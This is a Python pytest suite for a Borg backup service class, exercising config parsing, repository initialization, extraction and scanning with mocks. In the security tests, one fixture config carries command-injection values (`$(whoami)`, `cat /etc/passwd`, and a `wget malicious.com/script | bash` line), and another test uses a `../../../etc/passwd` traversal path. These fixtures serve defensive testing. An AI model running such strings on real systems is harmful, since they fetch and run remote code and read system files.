"""
Comprehensive tests for BorgService class - primary test suite

This test suite provides complete coverage of all BorgService functionality including:
- Repository configuration parsing and validation
- Backup creation with various options
- Archive listing and content browsing
- File extraction and streaming
- Repository scanning and discovery
- Security validation and error handling
- Edge cases and boundary conditions
- Platform compatibility

All tests use proper mocking to avoid external dependencies.
"""

import pytest
from unittest.mock import Mock, AsyncMock, patch, mock_open

from borgitory.models.borg_info import BorgRepositoryConfig
from borgitory.services.borg_service import BorgService
from borgitory.models.database import Repository
from borgitory.services.simple_command_runner import CommandResult


def create_test_borg_service(
    job_executor=None,
    command_runner=None,
    job_manager=None,
    volume_service=None,
    archive_service=None,
):
    """Helper function to create BorgService with all required dependencies for testing."""
    return BorgService(
        job_executor=job_executor or Mock(),
        command_runner=command_runner or Mock(),
        job_manager=job_manager or Mock(),
        volume_service=volume_service or Mock(),
        archive_service=archive_service or Mock(),
    )


class TestBorgServiceCore:
    """Test core BorgService functionality."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        # Create mock job manager
        self.mock_job_manager = Mock()
        self.borg_service = create_test_borg_service(job_manager=self.mock_job_manager)

        # Create mock repository
        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.id = 1
        self.mock_repository.name = "test-repo"
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None
        self.mock_repository.get_keyfile_content.return_value = None

    def test_init(self) -> None:
        """Test BorgService initialization."""
        service = create_test_borg_service()
        assert hasattr(service, "progress_pattern")
        assert service.progress_pattern is not None

    def test_progress_pattern_regex(self) -> None:
        """Test that progress pattern correctly matches Borg output."""
        # Test with realistic Borg progress line
        test_line = "123456 654321 111111 150 /path/to/some/file.txt"
        match = self.borg_service.progress_pattern.match(test_line)

        assert match is not None
        assert match.group("original_size") == "123456"
        assert match.group("compressed_size") == "654321"
        assert match.group("deduplicated_size") == "111111"
        assert match.group("nfiles") == "150"
        assert match.group("path") == "/path/to/some/file.txt"


class TestParseBorgConfig:
    """Test Borg repository config parsing."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

    def test_parse_config_file_not_exists(self) -> None:
        """Test parsing when config file doesn't exist."""
        with patch("os.path.exists", return_value=False):
            result = self.borg_service._parse_borg_config("/nonexistent/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Config file not found" in result.preview

    def test_parse_config_repokey_mode(self) -> None:
        """Test parsing repository with repokey encryption."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
key = very_long_key_data_that_indicates_repokey_mode_with_embedded_encryption_key_this_is_over_50_chars
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Borg repository detected" in result.preview

    def test_parse_config_keyfile_mode(self) -> None:
        """Test parsing repository with keyfile encryption."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
key = 
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=["key.abc123", "data"]):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Borg repository detected" in result.preview

    def test_parse_config_unencrypted(self) -> None:
        """Test parsing unencrypted repository."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Borg repository detected" in result.preview

    def test_parse_config_invalid_repository(self) -> None:
        """Test parsing invalid repository config."""
        config_content = """[not_a_repository_section]
some_key = some_value
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "invalid"
            assert result.requires_keyfile is False
            assert "Not a valid Borg repository" in result.preview

    def test_parse_config_read_error(self) -> None:
        """Test handling of config file read errors."""
        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", side_effect=IOError("Permission denied")
        ):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "error"
            assert result.requires_keyfile is False
            assert "Error reading config" in result.preview

    def test_parse_config_malformed_ini(self) -> None:
        """Test handling of malformed INI file."""
        malformed_content = """[repository
this is not valid ini content
key = value without proper section
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=malformed_content)
        ):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "error"
            assert "Error reading config" in result.preview


class TestRepositoryOperations:
    """Test repository management operations."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.mock_command_runner = Mock()
        self.borg_service = create_test_borg_service(
            command_runner=self.mock_command_runner
        )

        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.id = 1
        self.mock_repository.name = "test-repo"
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None

    @pytest.mark.asyncio
    async def test_initialize_repository_success(self) -> None:
        """Test successful repository initialization."""

        mock_command_result = CommandResult(
            success=True, return_code=0, stdout="", stderr="", duration=1.0
        )

        self.mock_command_runner.run_command = AsyncMock(
            return_value=mock_command_result
        )

        with patch(
            "borgitory.utils.security.build_secure_borg_command"
        ) as mock_build_cmd:
            mock_build_cmd.return_value = (
                ["borg", "init", "--encryption=repokey", "/path/to/repo"],
                {"BORG_PASSPHRASE": "test_passphrase"},
            )

            result = await self.borg_service.initialize_repository(self.mock_repository)

            assert result.success is True
            assert "initialized successfully" in result.message
            self.mock_command_runner.run_command.assert_called_once()

    @pytest.mark.asyncio
    async def test_initialize_repository_already_exists(self) -> None:
        """Test repository initialization when repo already exists."""

        mock_command_result = CommandResult(
            success=False,
            return_code=1,
            stdout="",
            stderr="A repository already exists at /path/to/repo",
            duration=1.0,
        )

        self.mock_command_runner.run_command = AsyncMock(
            return_value=mock_command_result
        )

        with patch(
            "borgitory.utils.security.build_secure_borg_command"
        ) as mock_build_cmd:
            mock_build_cmd.return_value = (["borg", "init"], {})

            result = await self.borg_service.initialize_repository(self.mock_repository)

            assert result.success is True
            assert "already exists" in result.message

    @pytest.mark.asyncio
    async def test_verify_repository_access_success(self) -> None:
        """Test successful repository access verification."""
        mock_job_manager = Mock()
        mock_job_manager.start_borg_command = AsyncMock(return_value="job-123")
        mock_job_manager.get_job_status.return_value = {
            "completed": True,
            "return_code": 0,
        }
        mock_job_manager.cleanup_job = Mock()

        # Using constructor-injected job manager instead of patching
        self.borg_service.job_manager = mock_job_manager
        with patch(
            "borgitory.utils.security.build_secure_borg_command"
        ) as mock_build_cmd:
            mock_build_cmd.return_value = (["borg", "list", "--short"], {})

            result = await self.borg_service.verify_repository_access(
                "/path/to/repo", "test_passphrase"
            )

            assert result is True
            mock_job_manager.cleanup_job.assert_called_once_with("job-123")

    @pytest.mark.asyncio
    async def test_verify_repository_access_failure(self) -> None:
        """Test repository access verification failure."""
        mock_job_manager = Mock()
        mock_job_manager.start_borg_command = AsyncMock(return_value="job-123")
        mock_job_manager.get_job_status.return_value = {
            "completed": True,
            "return_code": 1,
        }
        mock_job_manager.cleanup_job = Mock()

        # Using constructor-injected job manager instead of patching
        self.borg_service.job_manager = mock_job_manager
        with patch(
            "borgitory.utils.security.build_secure_borg_command"
        ) as mock_build_cmd:
            mock_build_cmd.return_value = (["borg", "list", "--short"], {})

            result = await self.borg_service.verify_repository_access(
                "/path/to/repo", "wrong_passphrase"
            )

            assert result is False
            mock_job_manager.cleanup_job.assert_called_once_with("job-123")


class TestGetRepoInfo:
    """Test repository information retrieval."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None


class TestListArchiveContents:
    """Test archive content listing operations."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None


class TestExtractFileStream:
    """Test file extraction and streaming."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None

    @pytest.mark.asyncio
    async def test_extract_file_stream_validation_error(self) -> None:
        """Test file extraction with validation error."""
        # Test with empty archive name (still invalid after security changes)
        with pytest.raises(Exception) as exc_info:
            await self.borg_service.extract_file_stream(
                self.mock_repository, "", "file.txt"
            )

        assert "Archive name must be a non-empty string" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_extract_file_stream_empty_path(self) -> None:
        """Test file extraction with empty file path."""
        with patch("borgitory.utils.security.validate_archive_name"):
            with pytest.raises(Exception) as exc_info:
                await self.borg_service.extract_file_stream(
                    self.mock_repository, "test-archive", ""
                )

            assert "File path is required" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_extract_file_stream_none_path(self) -> None:
        """Test file extraction with None file path."""
        with patch("borgitory.utils.security.validate_archive_name"):
            with pytest.raises(Exception) as exc_info:
                await self.borg_service.extract_file_stream(
                    self.mock_repository, "test-archive", ""
                )

            assert "File path is required" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_extract_file_stream_security_error(self) -> None:
        """Test file extraction with security validation error."""
        # Mock build_secure_borg_command_with_keyfile to raise an exception
        with patch(
            "borgitory.services.borg_service.build_secure_borg_command_with_keyfile"
        ) as mock_build:
            mock_build.side_effect = Exception("Security error")

            with pytest.raises(Exception) as exc_info:
                await self.borg_service.extract_file_stream(
                    self.mock_repository, "test-archive", "file.txt"
                )

            # Verify the mock was called
            assert mock_build.called

            # The error may be wrapped in "Failed to extract file" message
            error_message = str(exc_info.value)
            assert any(
                phrase in error_message
                for phrase in ["Security error", "Failed to extract file"]
            )


class TestSecurityIntegrationExtended:
    """Extended security integration tests."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None

    @pytest.mark.asyncio
    async def test_list_archives_security_validation(self) -> None:
        """Test that archive listing handles command runner errors properly."""
        # Mock the command runner to return an error result
        mock_command_runner = AsyncMock()
        mock_command_runner.run_command.return_value = Mock(
            success=False, return_code=2, stderr="Repository access denied"
        )

        # Create a service with the mocked command runner
        service = create_test_borg_service(command_runner=mock_command_runner)

        with pytest.raises(Exception) as exc_info:
            await service.list_archives(self.mock_repository)

        assert "Borg list failed with code 2" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_verify_repository_access_security_validation(self) -> None:
        """Test that repository access verification uses security validation."""
        with patch(
            "borgitory.utils.security.build_secure_borg_command",
            side_effect=Exception("Security error"),
        ):
            result = await self.borg_service.verify_repository_access(
                "../../../etc/passwd", "password"
            )

            assert result is False

    def test_config_parsing_handles_malicious_content_safely(self) -> None:
        """Test that config parsing handles potentially malicious content safely."""
        malicious_config = """[repository]
id = $(whoami)
segments_per_dir = `cat /etc/passwd`
key = ; wget malicious.com/script | bash
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=malicious_config)
        ), patch("os.listdir", return_value=[]):
            # Should parse without executing any commands
            result = self.borg_service._parse_borg_config("/test/repo")

            # Should treat as normal config data, not execute
            assert isinstance(result, BorgRepositoryConfig)
            # The malicious commands should be treated as literal string values
            assert result.mode in ["error", "unknown"]


class TestEdgeCasesAndBoundaryConditions:
    """Test edge cases and boundary conditions."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None

    def test_progress_pattern_boundary_cases(self) -> None:
        """Test progress pattern with boundary and edge cases."""
        # Test with zero values
        zero_line = "0 0 0 0 /"
        match = self.borg_service.progress_pattern.match(zero_line)
        assert match is not None
        assert match.group("original_size") == "0"
        assert match.group("path") == "/"

        # Test with maximum realistic values
        max_line = "999999999999999 888888888888888 777777777777777 9999999 /very/very/very/long/path/to/file/with/many/components.extension"
        match = self.borg_service.progress_pattern.match(max_line)
        assert match is not None
        assert match.group("original_size") == "999999999999999"

        # Test with invalid formats (should not match)
        invalid_cases = [
            "not a progress line",
            "abc def ghi jkl /path",
            "123 456 789",  # Missing components
            "",  # Empty string
        ]

        for invalid_line in invalid_cases:
            match = self.borg_service.progress_pattern.match(invalid_line)
            assert match is None, f"Pattern should not match: {invalid_line}"

        # Test edge case that does match (single space path gets trimmed)
        space_path_case = "123 456 789 10 "
        match = self.borg_service.progress_pattern.match(space_path_case)
        assert match is not None  # This should match because single space is valid path
        assert match.group("path") == ""  # The trailing space gets trimmed by the regex

    def test_config_parsing_with_unusual_encoding(self) -> None:
        """Test config parsing with various text encodings."""
        # Test with UTF-8 content containing special characters
        utf8_config = """[repository]
id = café123
segments_per_dir = 1000
key = résumé_ñoño
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=utf8_config)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/utf8/repo")

            assert isinstance(result, BorgRepositoryConfig)
            assert result.mode in ["error", "unknown"]
            # Should handle UTF-8 content gracefully

    @pytest.mark.asyncio
    async def test_concurrent_operation_safety(self) -> None:
        """Test that service handles concurrent operations safely."""
        # Create multiple service instances to simulate concurrent usage
        services = [create_test_borg_service() for _ in range(3)]

        # All should have independent regex patterns and state
        for service in services:
            assert service.progress_pattern is not None

            # Test that pattern works independently
            match = service.progress_pattern.match("100 50 25 1 /test/file.txt")
            assert match is not None
            assert match.group("path") == "/test/file.txt"

    def test_empty_and_whitespace_handling(self) -> None:
        """Test handling of empty and whitespace-only inputs."""
        # Test empty config file
        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data="")
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/empty/repo")
            assert result.mode == "invalid"
            assert "Not a valid Borg repository" in result.preview

        # Test whitespace-only config
        whitespace_content = "   \n\t\n   \n"
        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=whitespace_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/whitespace/repo")
            assert result.mode == "invalid"

    def test_special_characters_in_paths(self) -> None:
        """Test handling of special characters in file paths."""
        # Test progress pattern with special characters in path
        special_chars_line = "100 50 25 5 /path/with-special_chars@#$/file.txt"
        match = self.borg_service.progress_pattern.match(special_chars_line)
        assert match is not None
        assert match.group("path") == "/path/with-special_chars@#$/file.txt"

        # Test with spaces in path
        space_path_line = "100 50 25 5 /path with spaces/file name.txt"
        match = self.borg_service.progress_pattern.match(space_path_line)
        assert match is not None
        assert match.group("path") == "/path with spaces/file name.txt"


class TestBorgServiceRepositoryScanning:
    """Test repository scanning functionality using SimpleCommandRunner."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        # Create mock command runner
        self.mock_command_runner = Mock()
        self.mock_volume_service = Mock()

        # Create BorgService with mocked dependencies
        self.borg_service = create_test_borg_service(
            command_runner=self.mock_command_runner,
            volume_service=self.mock_volume_service,
        )

    @pytest.mark.asyncio
    async def test_scan_for_repositories_success(self) -> None:
        """Test successful repository scanning with multiple repositories found."""
        # Mock the abstracted I/O methods
        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
            return_value=["/mnt/backup1", "/mnt/backup2"]
        )

        # Mock path validation to return True for our test paths
        self.borg_service._validate_scan_path = Mock(return_value=True)

        # Mock repository path validation to return True for our test repo paths
        def mock_is_valid_repo_path(path: str) -> bool:
            return path in [
                "/mnt/backup1/repo1",
                "/mnt/backup2/repo2",
                "/mnt/backup1/repo3",
            ]

        self.borg_service._is_valid_repository_path = Mock(
            side_effect=mock_is_valid_repo_path
        )

        # Mock successful command execution
        mock_result = CommandResult(
            success=True,
            return_code=0,
            stdout="/mnt/backup1/repo1\n/mnt/backup2/repo2\n/mnt/backup1/repo3\n",
            stderr="",
            duration=2.5,
        )
        self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)

        # Mock the _parse_borg_config method to return encryption info
        from borgitory.models.borg_info import BorgRepositoryConfig

        self.borg_service._parse_borg_config = Mock(
            return_value=BorgRepositoryConfig(
                mode="repokey",
                requires_keyfile=False,
                preview="Repository config preview",
            )
        )

        # Mock sanitize_path to return paths unchanged for testing
        with patch(
            "borgitory.services.borg_service.sanitize_path", side_effect=lambda x: x
        ):
            result = await self.borg_service.scan_for_repositories()

            # Verify results
            assert len(result.repositories) == 3
            assert all(repo.detected for repo in result.repositories)
            assert all(
                repo.encryption_mode == "repokey" for repo in result.repositories
            )
            assert all(not repo.requires_keyfile for repo in result.repositories)

            # Verify paths are the expected paths from our mock output
            expected_paths = [
                "/mnt/backup1/repo1",
                "/mnt/backup2/repo2",
                "/mnt/backup1/repo3",
            ]
            actual_paths = [repo.path for repo in result.repositories]
            assert sorted(actual_paths) == sorted(expected_paths)

            # Verify command was called correctly
            self.mock_command_runner.run_command.assert_called_once()
            call_args = self.mock_command_runner.run_command.call_args
            command = call_args[0][0]  # First positional argument

            assert command[0] == "find"
            assert "/mnt/backup1" in command
            assert "/mnt/backup2" in command
            assert "-name" in command
            assert "config" in command

    @pytest.mark.asyncio
    async def test_scan_for_repositories_no_mounted_volumes(self) -> None:
        """Test scanning when no mounted volumes are found."""
        # Mock the abstracted I/O methods
        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
            return_value=[]
        )

        # Mock successful command execution - no repos found
        mock_result = CommandResult(
            success=True,
            return_code=0,
            stdout="",  # No repositories found
            stderr="",
            duration=1.0,
        )
        self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)

        # Mock sanitize_path to return paths unchanged for testing
        with patch(
            "borgitory.services.borg_service.sanitize_path", side_effect=lambda x: x
        ):
            result = await self.borg_service.scan_for_repositories()

            # Should return empty response since no repos found
            assert len(result.repositories) == 0
            assert result.scan_paths == []

    @pytest.mark.asyncio
    async def test_scan_for_repositories_command_failure(self) -> None:
        """Test handling of command execution failure."""
        # Mock the abstracted I/O methods
        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
            return_value=["/mnt/backup"]
        )
        self.borg_service._validate_scan_path = Mock(return_value=True)

        # Mock failed command execution
        mock_result = CommandResult(
            success=False,
            return_code=1,
            stdout="",
            stderr="find: permission denied",
            duration=0.5,
            error="find: permission denied",
        )
        self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)

        result = await self.borg_service.scan_for_repositories()

        # Should return empty response on failure
        assert len(result.repositories) == 0
        assert result.scan_paths == ["/mnt/backup"]
        self.mock_command_runner.run_command.assert_called_once()

    @pytest.mark.asyncio
    async def test_scan_for_repositories_invalid_paths_filtered(self) -> None:
        """Test that invalid repository paths are filtered out."""
        # Mock the abstracted I/O methods
        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
            return_value=["/mnt/backup"]
        )

        # Mock path validation to return True (scan path exists)
        self.borg_service._validate_scan_path = Mock(return_value=True)

        # Mock repository path validation to return True only for valid paths
        def mock_is_valid_repo_path(path: str) -> bool:
            # Only absolute paths starting with "/" that are "valid" repos
            return path in ["/valid/repo1", "/valid/repo2"]

        self.borg_service._is_valid_repository_path = Mock(
            side_effect=mock_is_valid_repo_path
        )

        # Mock command output with mix of valid and invalid paths
        mock_result = CommandResult(
            success=True,
            return_code=0,
            stdout="/valid/repo1\nrelative/path\n/valid/repo2\n/nonexistent/repo\n",
            stderr="",
            duration=1.5,
        )
        self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)

        # Mock _parse_borg_config
        self.borg_service._parse_borg_config = Mock(
            return_value=BorgRepositoryConfig(
                mode="repokey",
                requires_keyfile=False,
                preview="Valid repo config",
            )
        )

        result = await self.borg_service.scan_for_repositories()

        # Should only return valid absolute paths that exist as directories
        assert len(result.repositories) == 2
        paths = [repo.path for repo in result.repositories]
        assert "/valid/repo1" in paths
        assert "/valid/repo2" in paths
        # Invalid paths should not be in results
        assert not any("relative/path" in path for path in paths)
        assert not any("/nonexistent/repo" in path for path in paths)

    @pytest.mark.asyncio
    async def test_scan_for_repositories_empty_output(self) -> None:
        """Test handling of empty command output."""
        # Mock the abstracted I/O methods
        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
            return_value=["/mnt/backup"]
        )
        self.borg_service._validate_scan_path = Mock(return_value=True)

        # Mock command with empty output (no repositories found)
        mock_result = CommandResult(
            success=True, return_code=0, stdout="", stderr="", duration=0.1
        )
        self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)

        result = await self.borg_service.scan_for_repositories()

        # Should return empty response when no repositories found
        assert len(result.repositories) == 0

    @pytest.mark.asyncio
    async def test_scan_for_repositories_exception_handling(self) -> None:
        """Test proper exception handling during scanning."""
        # Mock the abstracted I/O methods
        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
            return_value=["/mnt/backup"]
        )
        self.borg_service._validate_scan_path = Mock(return_value=True)

        # Mock command runner to raise exception
        self.mock_command_runner.run_command = AsyncMock(
            side_effect=Exception("Command execution failed")
        )

        result = await self.borg_service.scan_for_repositories()

        # Should return empty response on exception
        assert len(result.repositories) == 0

    @pytest.mark.asyncio
    async def test_scan_for_repositories_timeout_parameter(self) -> None:
        """Test that correct timeout is passed to command runner."""
        # Mock the abstracted I/O methods
        self.borg_service.volume_service.get_mounted_volumes = AsyncMock(
            return_value=["/mnt/backup"]
        )
        self.borg_service._validate_scan_path = Mock(return_value=True)

        # Mock successful command execution
        mock_result = CommandResult(
            success=True, return_code=0, stdout="", stderr="", duration=1.0
        )
        self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)

        await self.borg_service.scan_for_repositories()

        # Verify timeout parameter was passed
        call_args = self.mock_command_runner.run_command.call_args
        assert call_args[1]["timeout"] == 300  # 5 minutes
